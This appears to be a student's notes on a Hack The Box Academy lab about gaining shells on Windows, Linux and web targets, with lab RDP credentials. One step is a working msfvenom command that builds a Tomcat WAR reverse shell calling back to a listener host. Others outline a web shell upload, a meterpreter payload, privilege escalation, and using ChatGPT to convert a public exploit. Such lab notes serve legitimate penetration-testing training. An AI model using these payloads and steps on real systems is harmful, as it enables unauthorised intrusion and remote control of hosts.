## Objectives:

- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Windows host or server`.
- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Linux host or server`.
- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Web application`.
- Demonstrate your ability to identify the `shell environment` you have access to as a user on the victim host.

# Connection
---
`xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt!`

# Targets
---
![[Pasted image 20250625065605.png]]

# Host 1
---
- Default credentials for `Manager`given, login on tomcat with those
- Make msfvenom reverse shell war file and upload:
	- `msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.1.7 lport=1234 -f war > shell.war`
- Run listener and get shell 
- https://www.hackingarticles.in/tomcat-penetration-testing/

# Host 2
---
- Exploit given on blog
- Convert the ruby to python code using ChatGPT
- Make few modifications to include Pentest Monkey's reverse shell
- [[Code for Facebook Style Blog (host-2)]]
- ![[Pasted image 20250626075457.png]]
- ![[Pasted image 20250626075507.png]]

# Host 3 
---
- Upload antak.aspx shell
- Upload shell.exe meterpreter from msfvenom
- Execute meterpreter payload from antak.aspx and get shell
- Run local exploit suggester to find reflection_juicy attack
- Run it to gain system shell
- ![[Pasted image 20250627063735.png]]